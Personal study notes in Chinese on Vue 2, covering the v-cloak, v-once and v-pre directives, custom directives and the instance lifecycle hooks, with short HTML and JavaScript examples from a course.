当网速过慢时，防止未经解析的模板出现在页面上

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			/* 选中所有标签中有v-cloak属性的标签 */
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

P43  v-once

1.v-once所在节点在初次动态渲染后，就视为静态内容了。

2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

P44 v-pre

1.跳过其所在节点的编译过程。（即程序员写的什么，页面展示什么）

 2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

P45 函数式

### 1.16.2、自定义指令

在自定义指令中，所有对DOM元素的操作都得自己写了。

1、局部指令

```js
new Vue({
    el:'#root',
    data:{
        name:'尚硅谷',
        n:1
    },
    directives:{
        //指令名有多个单词时，要用''号，不能用简写形式
        /* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
        //big函数何时会被调用？1.指令与元素成功绑定（元素还没放到页面中）时（一上来）。
        // 2.指令所在的模板被重新解析时，注意是此模板。（注意：指令所依赖的数据更新时这种总结不对！！！！）
        //这里的element是真实Dom，binding是绑定对象
        big(element,binding){
            console.log('big',this) //注意此处的this是window
            //innerText 文本内容
            element.innerText = binding.value * 10
        },
        fbind:{
            //指令与元素成功绑定时（一上来）
            bind(element,binding){
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element,binding){
                element.focus()
            },
            //指令所在的模板被重新解析时
            update(element,binding){
                element.value = binding.value
            }
        }
    }
})
```

使用

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
    <button @click="n++">点我n+1</button>
    <hr/>
    <!-- 实现需求2 -->
    <input type="text" v-fbind:value="n">
</div>
```

P47 自定义指令总结

1.指令定义时不加v-，但使用时要加v-；

2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

3.所有指令里面的this都是window,指令都是操作元素的，所以没用vm

2、注册全局指令

```js
//定义全局指令
Vue.directive('fbind',{
    //指令与元素成功绑定时（一上来）
    bind(element,binding){
        element.value = binding.value
    },
    //指令所在元素被插入页面时
    inserted(element,binding){
        element.focus()
    },
    //指令所在的模板被重新解析时
    update(element,binding){
        element.value = binding.value
    }
}) 
```

P48 引出生命周期

## 1.17、Vue实例生命周期

需求：欢迎学习四个字透明度从1到0不停变化

```html
<body>
		
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		 new Vue({
			el:'#root',
			data:{
				a:false,
				opacity:1
			},
			methods: {
				
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				setInterval(() => {
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
		})

		//通过外部的定时器实现（不推荐，还是想交给vm管理）这里需要设置好合适的频率页面显示才好看
		/* setInterval(() => {
			vm.opacity -= 0.01
			if(vm.opacity <= 0) vm.opacity = 1
		},16) */
	</script>
```

生命周期：

1.又名：生命周期回调函数、生命周期函数、生命周期钩子。

2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。

3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。

4.生命周期函数中的this指向是vm 或 组件实例对象。

P49 挂载周期

![](img\生命周期.png)

以上红色框里的才是生命周期函数，绿色块的一般称之为环节。

el‘s outerHTML 指的是包含el指向的最外层的标签，即’#root‘那个div也包含在模板中

1) 初始化显示 

\* beforeCreate() 

\* created() 

\* beforeMount() 

\* mounted() 

P50 更新流程

2) 更新状态: this.xxx = value 

\* beforeUpdate() 

\* updated()

P51 销毁流程

3) 销毁 vue 实例: vm.$destory() 这个方法完全销毁一个实例，清理它与其他实例的连接，解绑它的全部指令及自定义事件监听器

\* beforeDestory() 这里对数据的任何更新都不会促发页面的更新了

\* destoryed()

使用场景

1. mounted(): 发送 ajax 请求, 启动定时器等异步任务 
2. beforeDestory(): 做收尾工作, 如: 清除定时器

P52 总结

生命周期后面重新看

beforeCreate和created指的是初始化（数据监测数据代理）创建之前和创建完毕




## 